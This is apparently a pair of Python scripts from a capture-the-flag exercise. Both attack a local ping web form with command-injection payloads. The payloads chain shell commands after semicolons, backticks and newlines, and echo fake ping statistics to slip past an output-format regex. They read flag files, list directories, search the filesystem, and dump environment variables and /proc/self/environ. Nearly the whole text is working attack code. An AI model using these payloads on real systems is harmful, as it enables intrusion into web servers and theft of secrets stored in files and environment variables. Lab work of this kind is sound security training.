import requests
import re

url = 'http://127.0.0.1:33052/ping'

# Semicolon-based payloads to test
payloads = [
    # Basic semicolon with echo to match ping output format
    "127.0.0.1;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Semicolon with multiple commands
    "127.0.0.1;echo '2 packets transmitted, 2 received, 0% packet loss';whoami",
    
    # URL-encoded semicolon
    "127.0.0.1%3becho '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Command that reads flag file combined with echo
    "127.0.0.1;cat /flag.txt 2>/dev/null;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Alternative: try reading flag without suppressing errors
    "127.0.0.1;cat /flag.txt;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Without quotes around echo string
    "127.0.0.1;echo 2 packets transmitted, 2 received, 0% packet loss",
    
    # Double semicolon
    "127.0.0.1;;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Backticks for command substitution with semicolon
    "127.0.0.1;echo `cat /flag.txt`;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Newline injection attempt
    "127.0.0.1\necho '2 packets transmitted, 2 received, 0% packet loss'",
]

expected_regex = r'(.*?) packets transmitted, (.*?) received, (.*?)% packet loss'

for payload in payloads:
    print(f'┌─ Payload: {repr(payload)}')
    
    try:
        resp = requests.post(url, data={'ip_address': payload}, timeout=10)
        
        print(f'│ Status: {resp.status_code}')
        
        # Check if filter blocked us
        if "Invalid input" in resp.text:
            print("│ FILTER BLOCKED: 'Invalid input' detected")
        else:
            print("│ FILTER PASSED: No 'Invalid input' response")
        
        # Check if output matches expected regex
        if re.search(expected_regex, resp.text):
            print("│ REGEX MATCH: Output matches ping format regex")
        else:
            print("│ REGEX NO MATCH: Output does NOT match expected format")
        
        # Check for flag patterns
        flag_patterns = re.findall(r'(FLAG|flag|CTF|ctf)[{_\[][^{}]*[}\]]', resp.text, re.I)
        if flag_patterns:
            print(f"│ [!] FLAG PATTERNS FOUND: {flag_patterns}")
        
        # Print full response
        print(f"│ Response: {resp.text}")
        
    except Exception as e:
        print(f'│ ERROR: {e}')
    
    print('└─' + '-'*70)
    print()
import requests
import re

url = 'http://127.0.0.1:33052/ping'

# Try different flag file locations and read methods
payloads = [
    # Common flag file locations
    "127.0.0.1;cat /flag;echo '2 packets transmitted, 2 received, 0% packet loss'",
    "127.0.0.1;cat /root/flag.txt;echo '2 packets transmitted, 2 received, 0% packet loss'",
    "127.0.0.1;cat /home/app/flag.txt;echo '2 packets transmitted, 2 received, 0% packet loss'",
    "127.0.0.1;cat flag.txt;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Try to find flag files
    "127.0.0.1;find / -name 'flag*' 2>/dev/null | head -1;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Use command substitution to embed output into ping format
    "127.0.0.1;echo \"$(cat /flag.txt 2>&1) packets transmitted, 2 received, 0% packet loss\"",
    
    # Look for app directory
    "127.0.0.1;ls -la /app;echo '2 packets transmitted, 2 received, 0% packet loss'",
    "127.0.0.1;ls -la .;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Try environment variables
    "127.0.0.1;env;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Try to use base64 to avoid filter issues
    "127.0.0.1;base64 /flag.txt;echo '2 packets transmitted, 2 received, 0% packet loss'",
    
    # Try reading proc
    "127.0.0.1;cat /proc/self/environ;echo '2 packets transmitted, 2 received, 0% packet loss'",
]

expected_regex = r'(.*?) packets transmitted, (.*?) received, (.*?)% packet loss'

for payload in payloads:
    print(f'┌─ Payload: {repr(payload)}')
    
    try:
        resp = requests.post(url, data={'ip_address': payload}, timeout=10)
        
        print(f'│ Status: {resp.status_code}')
        
        # Check if filter blocked us
        if "Invalid input" in resp.text:
            print("│ FILTER BLOCKED: 'Invalid input' detected")
        else:
            print("│ FILTER PASSED: No 'Invalid input' response")
        
        # Extract the parsed values from the response
        parsed_match = re.search(r'Packets Transmitted: (.*?), Packets Received: (.*?), Packet Loss: (.*?)%', resp.text)
        if parsed_match:
            trans, recv, loss = parsed_match.groups()
            print(f"│ Parsed values: Transmitted='{trans}', Received='{recv}', Loss='{loss}'")
            if trans != "2" and "ping:" not in trans:
                print(f"│ [!] UNUSUAL Transmitted value - possible command output: {trans[:200]}")
        
        # Check for flag patterns
        flag_patterns = re.findall(r'(FLAG|flag|CTF|ctf)[{_\[][^{}]*[}\]]', resp.text, re.I)
        if flag_patterns:
            print(f"│ [!] FLAG PATTERNS FOUND: {flag_patterns}")
        
        # Print full response
        print(f"│ Response: {resp.text}")
        
    except Exception as e:
        print(f'│ ERROR: {e}')
    
    print('└─' + '-'*70)
    print()
